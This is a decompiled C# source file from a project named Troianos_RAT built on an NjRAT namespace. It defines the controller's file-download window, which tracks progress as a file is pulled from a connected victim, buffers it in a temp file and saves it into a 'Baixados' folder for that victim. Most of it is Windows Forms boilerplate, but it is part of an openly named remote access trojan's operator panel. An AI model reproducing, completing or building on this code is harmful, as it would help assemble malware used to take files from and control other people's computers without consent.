using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x0200000D RID: 13
	[DesignerGenerated]
	public partial class DW : Form
	{
		// Token: 0x060000DC RID: 220 RVA: 0x001E0604 File Offset: 0x001DEA04
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = DW.__ENCList;
			lock (_ENCList)
			{
				bool flag = DW.__ENCList.Count == DW.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = DW.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = DW.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								DW.__ENCList[num] = DW.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					DW.__ENCList.RemoveRange(num, DW.__ENCList.Count - num);
					DW.__ENCList.Capacity = DW.__ENCList.Count;
				}
				DW.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060000DF RID: 223 RVA: 0x001E0BC8 File Offset: 0x001DEFC8
		// (set) Token: 0x060000E0 RID: 224 RVA: 0x001E0BE0 File Offset: 0x001DEFE0
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x060000E1 RID: 225 RVA: 0x001E0BEC File Offset: 0x001DEFEC
		// (set) Token: 0x060000E2 RID: 226 RVA: 0x001E0C04 File Offset: 0x001DF004
		internal virtual GClass9 Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Lv1_SelectedIndexChanged);
				bool flag = this._Lv1 != null;
				if (flag)
				{
					this._Lv1.SelectedIndexChanged -= value2;
				}
				this._Lv1 = value;
				flag = (this._Lv1 != null);
				if (flag)
				{
					this._Lv1.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060000E3 RID: 227 RVA: 0x001E0C64 File Offset: 0x001DF064
		// (set) Token: 0x060000E4 RID: 228 RVA: 0x001E0C7C File Offset: 0x001DF07C
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700004C RID: 76
		// (get) Token: 0x060000E5 RID: 229 RVA: 0x001E0CDC File Offset: 0x001DF0DC
		// (set) Token: 0x060000E6 RID: 230 RVA: 0x001E0CF4 File Offset: 0x001DF0F4
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060000E7 RID: 231 RVA: 0x001E0D54 File Offset: 0x001DF154
		// (set) Token: 0x060000E8 RID: 232 RVA: 0x001E0D6C File Offset: 0x001DF16C
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060000E9 RID: 233 RVA: 0x001E0D78 File Offset: 0x001DF178
		// (set) Token: 0x060000EA RID: 234 RVA: 0x001E0D90 File Offset: 0x001DF190
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x060000EB RID: 235 RVA: 0x001E0D9C File Offset: 0x001DF19C
		public DW()
		{
			base.FormClosing += this.DW_FormClosing;
			base.Load += this.DW_Load;
			DW.__ENCAddToList(this);
			this.os = 0;
			this.InitializeComponent();
		}

		// Token: 0x060000EC RID: 236 RVA: 0x001E0DF0 File Offset: 0x001DF1F0
		private void DW_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.FS.Close();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.FS.Dispose();
			}
			catch (Exception ex2)
			{
			}
			try
			{
				File.Delete(this.tmp);
			}
			catch (Exception ex3)
			{
			}
			this.Button1.Enabled = false;
			this.c.CN = false;
		}

		// Token: 0x060000ED RID: 237 RVA: 0x001E0EA0 File Offset: 0x001DF2A0
		private void DW_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)), " - ")), Class6.smethod_16(this.FN))));
			this.ProgressBar1.Maximum = this.SZ;
			this.folder = this.osk.Folder + "Baixados\\";
			bool flag = !Directory.Exists(this.folder);
			if (flag)
			{
				Directory.CreateDirectory(this.folder);
			}
			this.folder += new FileInfo(Class6.smethod_16(this.FN)).Name;
			this.Lv1.Items[0].SubItems[0].Text = new FileInfo(Class6.smethod_16(this.FN)).Name;
			this.Lv1.Items[1].SubItems[0].Text = Class6.smethod_17((long)this.SZ);
			do
			{
				this.tmp = Interaction.Environ("Temporarios") + "\\njfm_" + Class6.smethod_6(10);
			}
			while (File.Exists(this.tmp));
			this.FS = new FileStream(this.tmp, FileMode.Append);
			this.Lv1.Items[2].SubItems[0].Text = Class6.smethod_17((long)(this.ProgressBar1.Value - this.os));
			this.os = this.ProgressBar1.Value;
			this.Lv1.Items[3].SubItems[0].Text = Class6.smethod_17((long)this.ProgressBar1.Value);
			this.Lv1.method_3();
			this.Timer1.Enabled = true;
		}

		// Token: 0x060000EE RID: 238 RVA: 0x001E10A8 File Offset: 0x001DF4A8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Items[2].SubItems[1].Text = Class6.smethod_17((long)(this.ProgressBar1.Value - this.os));
				this.os = this.ProgressBar1.Value;
				this.Lv1.Items[3].SubItems[1].Text = Class6.smethod_17((long)this.ProgressBar1.Value);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000EF RID: 239 RVA: 0x001E1158 File Offset: 0x001DF558
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Parar", false) == 0;
			if (flag)
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Delete(this.tmp);
				this.Button1.Enabled = false;
				this.c.CN = false;
				this.Close();
			}
			else
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Move(this.tmp, this.folder);
			}
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x001E11F8 File Offset: 0x001DF5F8
		private void Lv1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0400006C RID: 108
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400006E RID: 110
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x0400006F RID: 111
		[AccessedThroughProperty("Lv1")]
		private GClass9 _Lv1;

		// Token: 0x04000070 RID: 112
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000071 RID: 113
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x04000072 RID: 114
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x04000073 RID: 115
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x04000074 RID: 116
		public Client c;

		// Token: 0x04000075 RID: 117
		public string FN;

		// Token: 0x04000076 RID: 118
		public string folder;

		// Token: 0x04000077 RID: 119
		public FileStream FS;

		// Token: 0x04000078 RID: 120
		public int os;

		// Token: 0x04000079 RID: 121
		public Client osk;

		// Token: 0x0400007A RID: 122
		public int SZ;

		// Token: 0x0400007B RID: 123
		public string tmp;
	}
}
